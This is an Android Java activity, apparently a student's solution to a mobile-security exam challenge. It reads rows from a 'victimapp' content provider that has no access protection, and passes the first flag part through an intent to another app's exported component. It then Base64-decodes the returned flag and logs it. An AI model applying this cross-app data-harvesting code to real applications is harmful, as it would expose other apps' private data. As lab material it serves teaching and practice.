package com.student.solution;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.util.Base64;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    @SuppressLint("Range")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Uri uri = Uri.parse("content://com.example.victimapp.MyProvider/joke");

        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        if (null == cursor) {
            Log.e("inspect", "error");
            // If the Cursor is empty, the provider found no matches
        } else if (cursor.getCount() < 1) {
            Log.e("inspect", "unsuccessful");
        } else {
            Log.e("inspect ", String.valueOf(cursor));
            String joke = "joke";
            String author = "author";
            if (cursor.moveToFirst()) {
                do{
                    //print all, among them there's the flag
                    if (Objects.equals(cursor.getString(cursor.getColumnIndex(author)), "mobiotsec_exam")){
                        String firstflag = cursor.getString(cursor.getColumnIndex(joke));
                        Log.i("EXAM", firstflag);
                        Intent intent = new Intent();
                        intent.setAction("com.mobiotsec.exam.intent.action.GIMMETHEFLAG");
                        intent.putExtra("firstFlagPart", firstflag);
                        startActivityForResult(intent, 100);
                    }

                } while (cursor.moveToNext());
            }

        }


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100) {
            String secondFlag = data.getExtras().getString("flag");
            Log.i("EXAM", secondFlag);
            byte[] real = Base64.getDecoder().decode(secondFlag);
            String realFlag = null;
            try {
                realFlag = new String(real, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            Log.i("EXAM", realFlag);
        }
    }
}